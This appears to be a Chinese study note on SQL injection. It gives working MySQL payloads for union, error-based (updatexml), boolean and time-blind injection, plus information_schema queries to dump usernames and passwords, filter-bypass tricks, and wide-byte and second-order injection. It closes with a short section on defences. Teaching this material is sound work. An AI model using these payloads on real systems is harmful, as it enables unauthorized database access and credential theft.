# 04 · SQL 注入（task4）

# 一、原理

**根因：把用户输入直接拼进 SQL 语句**，数据库分不清"指令"和"数据"。

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id";   // 直接拼接
mysqli_query($conn, $sql);
```

```
正常：?id=1        → WHERE id=1
注入：?id=1 or 1=1 → WHERE id=1 or 1=1     （恒真，查出所有）
```

### 逃逸与闭合

| 闭合符 | 场景 |
|---|---|
| `'` | 单引号字符型（最常见） |
| `"` | 双引号字符型 |
| `)` | 括号内的值 |
| `')` / `")` / `'))` | 组合 |

### 注释符（屏蔽后面干扰）

| 注释 | 说明 |
|---|---|
| `-- ` | **后面必须有空格**，URL 里用 `--+` |
| `#` | MySQL 特有，**URL 要编码成 `%23`** |
| `/**/` | 内联注释，**常用来绕空格过滤**。它**只在「按 token 解析」的语言里能当空格**（SQL / PHP / JS 代码层），**字符串里和 shell 里都无效** → 跨语言对照表见 [12](./12-注释当空格与命令绕过.md) |

# 二、判断四步（**背**）

```
第1步：判类型（数字型 or 字符型）
  ?id=1 and 1=1  正常 / ?id=1 and 1=2  异常  →  数字型（不用闭合）
  两种都一样                                  →  字符型（要闭合引号）

第2步：找闭合符
  ?id=1'  看报错
    报错里 ''  →  '
    报错里 ')  →  ')
    报错里 ""  →  "

第3步：数显位（列数）
  ?id=1 order by 1 / 2 / 3 ...  加到报错 → 列数 = 报错前那个

第4步：定位回显位
  ?id=-1' union select 1,2,3 --+
  看页面上哪个数字显示了
```

**`-1` 的作用**：让原查询查空，这样 union 的结果才会显示。

# 三、分类

## 3.1 按回显方式（最常用）

| 类型 | 特征 | 核心 payload |
|---|---|---|
| **联合查询** | 有显示位 | `union select 1,2,3` |
| **报错注入** | 无数据显示，**有报错** | `updatexml(1,concat(0x7e,(select database())),1)` |
| **布尔盲注** | 只有"真/假" | `and ascii(substr(database(),1,1))>100` |
| **时间盲注** | 完全无差别 | `and if(1=1, sleep(5), 1)` |

## 3.2 按位置/编码

| 类型 | 说明 |
|---|---|
| **POST 注入** | 登录框，参数在 body |
| **Cookie 注入** | `Cookie: uname=admin'...` |
| **HTTP 头注入** | User-Agent / Referer 被拼进 SQL |
| **宽字节注入** | GBK 吃掉转义符 `\` → `%df'` |
| **二次注入** | 存时转义，取出用时不转义 |

# 四、information_schema（查数据三步）

| 表 | 字段 | 查什么 |
|---|---|---|
| **SCHEMATA** | `schema_name` | 库名 |
| **TABLES** | `table_name`, `table_schema` | 表名（需指定库） |
| **COLUMNS** | `column_name`, `table_name` | 列名（需指定表） |

## 联合注入完整流程

```sql
-- ① 查库名
union select 1,group_concat(schema_name),3 from information_schema.schemata

-- ② 查表名（已知库 security）
union select 1,group_concat(table_name),3 from information_schema.tables
  where table_schema='security'

-- ③ 查列名（已知表 users）
union select 1,group_concat(column_name),3 from information_schema.columns
  where table_name='users'

-- ④ 查数据
union select 1,group_concat(username,0x3a,password),3 from users
-- 0x3a = 冒号，用来分隔
```

**`group_concat` 要点**：
```sql
group_concat(table_name)                    -- 默认逗号分隔
group_concat(table_name separator '|')      -- 自定义分隔符
group_concat(a, 0x3a, b)                    -- 拼多字段
-- 默认限制 1024 字节，会截断！
SET SESSION group_concat_max_len = 100000;
```

# 五、报错注入

**原理**：`updatexml(文档, XPath, 新值)` —— 若 XPath **格式非法**，MySQL 报错并**把内容显示出来**。

```sql
-- 查库名
?id=1' and updatexml(1,concat(0x7e,(select database())),1)--+
-- 0x7e 是 ~，让 XPath 非法

-- 等价函数
?id=1' and extractvalue(1,concat(0x7e,(select database())))--+
```

**最多回显 32 字符**，超长要用 `substr()` 截断。

# 六、盲注

## 布尔盲注（有真假差异）

```sql
?id=1' and length(database())=8--+                        -- 猜长度
?id=1' and ascii(substr(database(),1,1))>100--+           -- 二分猜字符
?id=1' and ascii(substr(database(),1,1))=115--+           -- 精确
```

## 时间盲注（完全没差别）

```sql
?id=1' and if(ascii(substr(database(),1,1))>100, sleep(5), 1)--+
-- 条件真 → 页面卡 5 秒

-- sleep 被禁时用
?id=1' and if(条件, benchmark(1000000, md5(1)), 1)--+
```

# 七、绕过技巧

| 被过滤 | 绕过 |
|---|---|
| **空格** | `/**/`、`%09`、`%0a`、`()` |
| **注释符** | `#` ↔ `-- ` ↔ `/**/` |
| **`union`** | 大小写 `UNION`、**双写** `uniunionon`、`/*!union*/` |
| **`select`** | 双写 `selselectect` |
| **`and`/`or`** | `&&` / `\ | \ | `、`%26%26` |
| **`=`** | `like`、`in`、`between` |
| **逗号** | `join`、`limit 1 offset 0` |
| **`substr`** | `mid`、`substring`、`left`、`right` |
| **`ascii`** | `ord`、`hex` |
| **`information_schema`** | `mysql.innodb_table_stats`（5.7+） |

**双写原理**：
```
过滤代码：str_replace('union', '', $id)
输入：uniunionon
删除中间那个 union → 剩下 union
```

# 八、宽字节注入（GBK）

```php
$id = addslashes($_GET['id']);       // ' → \'   （0x27 → 0x5C 0x27）
// 数据库是 GBK 编码
```

**攻击**：输入 `%df'`
```
%df(0xDF) + \(0x5C)  →  GBK 认为是一个汉字  →  反斜杠被吃掉
剩下的 ' 逃逸出来
```

**payload**：`?id=-1%df' union select 1,2,3 --+`

# 九、二次注入

```
① 注册用户名 admin'#     → 后端转义成 admin\'# 存入（实际库里是 admin'#）
② 之后某功能从库里取出用户名再拼 SQL（此时不再转义）
③ 导致 '# 生效 → 注入
```

**特点**：注入发生在**第二次使用**时，光看插入处代码发现不了。

# 十、防御

| 方法 | 说明 |
|---|---|
| **预处理（参数化查询）** | **终极方案**，代码与数据分离 |
| 白名单 | 只允许数字/字母 |
| 转义特殊字符 | `'` `"` `\` `--` `#` |
| 最小权限 | 数据库账号不给 FILE/PROCESS |
| 关闭报错回显 | 防止报错注入 |
| 统一字符集 | 防宽字节 |

# 十一、一句话

> **SQL 注入 = 输入拼进 SQL**。**判断四步：`and 1=1/1=2` 判类型 → `'` 探闭合符 → `order by` 数显位 → `union select` 定位**。**分类：有显示位用联合、有报错用 updatexml、只有真假用布尔、全无差别用时间**。**查数据固定用 `information_schema`（SCHEMATA→TABLES→COLUMNS）**。
